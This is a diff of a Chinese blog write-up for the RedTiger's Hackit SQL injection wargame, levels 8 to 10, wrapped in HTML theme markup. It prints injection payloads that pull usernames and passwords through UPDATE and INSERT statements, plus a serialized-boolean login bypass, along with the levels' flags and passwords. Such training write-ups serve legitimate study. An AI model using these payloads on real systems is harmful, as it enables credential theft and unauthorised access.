-<p>报错信息为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;12345&#x27;,age = &#x27;90&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
-<p>可以看到，被影响的只有 icq 和 age，而 name 没被影响，推测后台语句如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,emai=&#x27;[input]&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
+<p>依次对所有的输入添加单引号，发现只有 Email 报错： <pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39;, age &#x3D; &#39;1&#39; WHERE id &#x3D; 1&#39; at line 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>如果payload如下： <pre class="line-numbers language-none"><code class="language-none">email&#x3D;1&#39;&amp;name&#x3D;abc&amp;icq&#x3D;12345&amp;age&#x3D;90&amp;edit&#x3D;Edit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>报错信息为： <pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;12345&#39;,age &#x3D; &#39;90&#39; WHERE id &#x3D; 1&#39; at line 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>可以看到，被影响的只有 icq 和 age，而 name 没被影响，推测后台语句如下： <pre class="line-numbers language-none"><code class="language-none">update tableName set name&#x3D;&#39;[input]&#39;,emai&#x3D;&#39;[input]&#39;,icq&#x3D;&#39;[input]&#39;,age&#x3D;&#39;[input]&#39; where id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <h2 id="注入过程-7">注入过程</h2>
 <p>上述可知，我们需要将密码的值赋给4个字段中的其中一个，有两种情况： - icq和age其中一个</p>
-<p>有一个问题，这两个字段都在email的后面，要想赋值给这两个其中之一，需要在email中写完之后，将后面的所有语句注释掉。即： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#</span><br><span class="line"></span><br><span class="line">真正查询语句为：update tableName set name=&#x27;[input]&#x27;,emai=&#x27;1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
+<p>有一个问题，这两个字段都在email的后面，要想赋值给这两个其中之一，需要在email中写完之后，将后面的所有语句注释掉。即： <pre class="line-numbers language-none"><code class="language-none">email&#x3D;1&#39;,icq&#x3D;password,age&#x3D;&#39;23&#39; where id&#x3D;1;#
+
+真正查询语句为：update tableName set name&#x3D;&#39;[input]&#39;,emai&#x3D;&#39;1&#39;,icq&#x3D;password,age&#x3D;&#39;23&#39; where id&#x3D;1;#&#39;,icq&#x3D;&#39;[input]&#39;,age&#x3D;&#39;[input]&#39; where id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
 <p>测试发现这种做法不行。报错信息为：<code>near 'icq = '12345',age = '90' WHERE id = 1'</code>。</p>
 <ul>
 <li>email和name其中一个</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据报错信息：12345&#x27;,age = &#x27;90&#x27; WHERE id = 1，需要将 icq=&#x27; 补齐</span><br><span class="line">1. email=&#x27;,email=password,icq=&#x27;</span><br><span class="line">2. email=1&#x27;,name=password,icq=&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">根据报错信息：12345&#39;,age &#x3D; &#39;90&#39; WHERE id &#x3D; 1，需要将 icq&#x3D;&#39; 补齐
+1. email&#x3D;&#39;,email&#x3D;password,icq&#x3D;&#39;
+2. email&#x3D;1&#39;,name&#x3D;password,icq&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318212222.png" /></p>
-<p>成功得到密码。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: network_pancakes_milk_and_wine</span><br></pre></td></tr></table></figure></p>
+<p>成功得到密码。 <pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715  
+  
+The password for the next level is: network_pancakes_milk_and_wine<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
 <h3 id="疑惑点">疑惑点 ⭐</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. email=&#x27;</span><br><span class="line">2. email=&#x27;#</span><br></pre></td></tr></table></figure>
-<p>报错信息分别为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 12345&#x27; balabala</span><br><span class="line">2. icq=&#x27;12345&#x27; balabala</span><br></pre></td></tr></table></figure></p>
+<pre class="line-numbers language-none"><code class="language-none">1. email&#x3D;&#39;
+2. email&#x3D;&#39;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>报错信息分别为： <pre class="line-numbers language-none"><code class="language-none">1. 12345&#39; balabala
+2. icq&#x3D;&#39;12345&#39; balabala<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
 <p>也就是注释符只注释了email=’‘ 中后面的单引号。前者为 <code>(email='')(',icq=')12345'</code>，括号只是为了方便看。而后者为 <code>(email='')#',icq='12345'</code>，按道理后面的都应该被注释掉了，我的猜测如下（本人php代码差，如果有误请多多批评）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,</span><br><span class="line">emai=&#x27;[input]&#x27;,</span><br><span class="line">icq=&#x27;[input]&#x27;,</span><br><span class="line">age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">update tableName set name&#x3D;&#39;[input]&#39;,
+emai&#x3D;&#39;[input]&#39;,
+icq&#x3D;&#39;[input]&#39;,
+age&#x3D;&#39;[input]&#39; where id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这样子注释符就只会注释掉email那行最后面的单引号和逗号，从而报错信息变为 <code>icq='12345' balabala</code>。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213900.png" /></p>
 <p>图上报错信息中的换行符也应证了我的猜想。</p>
@@ -561,18 +538,24 @@
 <p>在输入框填入东西后，提交查询，发现多了信息： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214029.png" /></p>
 <p>因此猜测后台使用的语句是 <code>insert into</code>。</p>
 <p><code>inser into</code> 语句格式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br><span class="line">指定所要插入数据的列:</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br><span class="line">一次性添加多个：（注意，如果有主键，主键必须不同）</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....),(值1, 值2,....),(值1, 值2,....),...</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">INSERT INTO 表名称 VALUES (值1, 值2,....)
+指定所要插入数据的列:
+INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)
+一次性添加多个：（注意，如果有主键，主键必须不同）
+INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....),(值1, 值2,....),(值1, 值2,....),...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="测试注入点-8">测试注入点</h2>
 <p>依次对三个输入框添加单引号，发现 <code>autor=1&amp;title=1&amp;text=1'</code> 时出现报错信息： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214508.png" /></p>
-<p>单独将重要信息提取：<code>'1'')</code>，可以猜测后台语句为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;input&#x27;);</span><br></pre></td></tr></table></figure></p>
+<p>单独将重要信息提取：<code>'1'')</code>，可以猜测后台语句为： <pre class="line-numbers language-none"><code class="language-none">INSERT INTO level9_users (autor,title,text) VALUES (&#39;input&#39;,&#39;input&#39;,&#39;input&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>输入 <code>autor=1&amp;title=1&amp;text=1')#</code> 发现页面正常，验证了猜测。</p>
 <h2 id="注入过程-8">注入过程</h2>
 <p>利用一次性添加多个。</p>
-<p>构造如下payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456</span><br></pre></td></tr></table></figure></p>
-<p>带入后为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456&#x27;);</span><br></pre></td></tr></table></figure></p>
+<p>构造如下payload： <pre class="line-numbers language-none"><code class="language-none">autor&#x3D;1&amp;title&#x3D;1&amp;text&#x3D;1&#39;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#39;456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>带入后为： <pre class="line-numbers language-none"><code class="language-none">INSERT INTO level9_users (autor,title,text) VALUES (&#39;input&#39;,&#39;input&#39;,&#39;1&#39;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#39;456&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>正好将 username 和 password 作为 autor 和 title 显示出来。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220051.png" /></p>
 <p>成功登录。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679</span><br><span class="line"></span><br><span class="line">The password for the next level is: whatever_just_a_fresh_password</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679
+
+The password for the next level is: whatever_just_a_fresh_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h1 id="level-10">Level-10 ⭐</h1>
 <h2 id="题目描述-9">题目描述</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220508.png" /></p>
@@ -581,121 +564,185 @@
 <h2 id="测试注入点-9">测试注入点</h2>
 <p>由于没有多余的信息，并且url也不存在注入点，所以抓包看看： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220631.png" /></p>
 <p>一般垂直提权都是看cookie，但是这里cookie的信息是登录每道题的，所以应该是post中的 <code>login</code>。将上面的字符串base64解码后得到： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220733.png" /></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里应该需要修改username和password的值，也就是第2和第4的内容。</p>
-<p>经过多次测试，还是毫无发现。就去看了下大佬的writeup，根据推测，后台语句为： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$input</span> = unserialize(base64_encode(<span class="variable">$POST</span>[<span class="string">&quot;login&quot;</span>]));</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$input</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$input</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from users where username=<span class="subst">$username</span> and password=<span class="subst">$password</span>&quot;</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>经过多次测试，还是毫无发现。就去看了下大佬的writeup，根据推测，后台语句为： <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select username,password from users where username=<span class="token interpolation"><span class="token variable">$username</span></span> and password=<span class="token interpolation"><span class="token variable">$password</span></span>"</span><span class="token punctuation">;</span>
+<span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>用户名为：<code>TheMaster</code>。密码不知道，所以 password 即为注入点。</p>
 <h2 id="注入过程-9">注入过程</h2>
 <p>本题要想成功登录，就得 where 后面的语句为真，即<code>username=$username</code>和<code>password=$password</code>同时为真。前者简单，后者可以这么操作，即<code>password=true</code>，这样子就能绕过where的判断。</p>
-<p>因此最后的payload如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125; </span><br><span class="line">解释：bool型的就是b，且true为1，false为0</span><br></pre></td></tr></table></figure></p>
+<p>因此最后的payload如下： <pre class="line-numbers language-none"><code class="language-none">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125; 
+解释：bool型的就是b，且true为1，false为0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
 <p>经过base64编码后带入即可成功登录。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52  </span><br><span class="line"></span><br><span class="line">The password for the hall of fame is: make_the_internet_great_again</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52  
+
+The password for the hall of fame is: make_the_internet_great_again<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h1 id="总结">总结</h1>
 <p>经过这十道题，发现sql注入不仅仅是常规类型的考察，还有不同语句，如：update，insert into等。有时候还要猜测后台语句的写法，或者像 Level-6一样，注入语句中返回的结果作为输入二次查询，还得明白常见的后台判断。总之，收获良多，是很好的题目。</p>
 
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
     </div>
 
-    
-    
-    
 
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-          </div>
 
         
+          <div id="footer-post-container">
+  <div id="footer-post">
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2022/01/30/pickle%20%E5%BA%93/" rel="prev" title="pickle 库">
-                  <i class="fa fa-chevron-left"></i> pickle 库
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/" rel="next" title="网鼎杯 2018 Fakebook">
-                  网鼎杯 2018 Fakebook <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
 
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#level-1"><span class="toc-number">1.</span> <span class="toc-text">Level-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-2"><span class="toc-number">2.</span> <span class="toc-text">Level-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-1"><span class="toc-number">2.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-1"><span class="toc-number">2.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-3"><span class="toc-number">3.</span> <span class="toc-text">Level-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">3.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-2"><span class="toc-number">3.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-2"><span class="toc-number">3.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-4"><span class="toc-number">4.</span> <span class="toc-text">Level-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">4.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-3"><span class="toc-number">4.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-3"><span class="toc-number">4.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-5"><span class="toc-number">5.</span> <span class="toc-text">Level-5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">5.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-4"><span class="toc-number">5.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-4"><span class="toc-number">5.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-6"><span class="toc-number">6.</span> <span class="toc-text">Level-6 ⭐</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5"><span class="toc-number">6.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-5"><span class="toc-number">6.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-5"><span class="toc-number">6.3.</span> <span class="toc-text">注入过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">6.3.1.</span> <span class="toc-text">思路 ⭐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">6.3.2.</span> <span class="toc-text">过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-7"><span class="toc-number">7.</span> <span class="toc-text">Level-7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6"><span class="toc-number">7.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-6"><span class="toc-number">7.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-6"><span class="toc-number">7.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-8"><span class="toc-number">8.</span> <span class="toc-text">Level-8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7"><span class="toc-number">8.1.</span> <span class="toc-text">题目描述 ⭐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-7"><span class="toc-number">8.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-7"><span class="toc-number">8.3.</span> <span class="toc-text">注入过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%96%91%E6%83%91%E7%82%B9"><span class="toc-number">8.3.1.</span> <span class="toc-text">疑惑点 ⭐</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-9"><span class="toc-number">9.</span> <span class="toc-text">Level-9</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8"><span class="toc-number">9.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-8"><span class="toc-number">9.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-8"><span class="toc-number">9.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-10"><span class="toc-number">10.</span> <span class="toc-text">Level-10 ⭐</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9"><span class="toc-number">10.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-9"><span class="toc-number">10.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-9"><span class="toc-number">10.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">11.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
 
-
-
-
-
-    
-  <div class="comments" id="disqus_thread">
-    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
-  </div>
-  
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">hdfzzf</span>
-</div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-      <span>站点总字数：</span>
-    <span title="站点总字数">534k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">8:05</span>
-  </span>
-</div>
-<div class="busuanzi-count">
-</div>
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&text=Redtiger_Hackit_WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&is_video=false&description=Redtiger_Hackit_WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Redtiger_Hackit_WriteUp&body=Check out this article: https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
